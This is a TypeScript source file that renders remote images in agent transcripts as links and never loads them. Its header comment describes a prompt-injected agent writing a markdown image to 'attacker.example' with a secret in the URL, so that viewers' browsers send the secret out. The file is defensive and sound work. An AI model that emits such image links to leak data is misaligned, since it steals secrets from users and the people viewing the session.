/**
 * Remote images in rendered markdown are shown as links, never loaded.
 *
 * Agent output is untrusted: a prompt-injected agent can write
 * `![](https://attacker.example/?d=<secret>)`, and every browser viewing the
 * session, grantees included, would fetch it. Turning the image into a link
 * closes that exfiltration path regardless of the CSP, and keeps transcripts
 * from contacting third-party hosts at all.
 *
 * Every src is resolved the way the browser resolves it (against the
 * document's base URL) and judged by the resulting origin, so spellings that
 * browsers read as another host, such as `https:/host` on an http page,
 * `/\host` or `https:\\host`, count as remote too.
 */

/** How an image src in rendered output is shown. */
export type ImageSource =
  /** Loads as an `<img>`: a `data:image/…` URL or a same-origin http(s) URL. */
  | { kind: 'local'; src: string }
  /** Would load from another origin: shown as a link to `href` instead. */
  | { kind: 'remote'; href: string; host: string }
  /** Not an image the page may load (empty, unparseable, or another scheme). */
  | { kind: 'blocked' }

/**
 * Classify an image src. `pageUrl` is the URL relative srcs resolve against;
 * it defaults to the document's base URL.
 */
export function classifyImageSrc(src: string | undefined | null, pageUrl = currentPageUrl()): ImageSource {
  const trimmed = src?.trim()
  if (!trimmed) return { kind: 'blocked' }
  if (/^data:image\//i.test(trimmed)) return { kind: 'local', src: trimmed }
  let page: URL
  let url: URL
  try {
    page = new URL(pageUrl)
    url = new URL(trimmed, page)
  } catch {
    return { kind: 'blocked' }
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') return { kind: 'blocked' }
  if (url.origin !== page.origin) return { kind: 'remote', href: url.href, host: url.host }
  return { kind: 'local', src: url.href }
}

/** Text for the link that stands in for a remote image. */
export function remoteImageLabel(host: string, alt: string | undefined | null): string {
  const description = alt?.trim()
  return description ? `External image: ${description} (${host})` : `External image (${host})`
}

function currentPageUrl(): string {
  if (typeof document !== 'undefined' && document.baseURI) return document.baseURI
  return typeof window === 'undefined' ? 'about:blank' : window.location.href
}
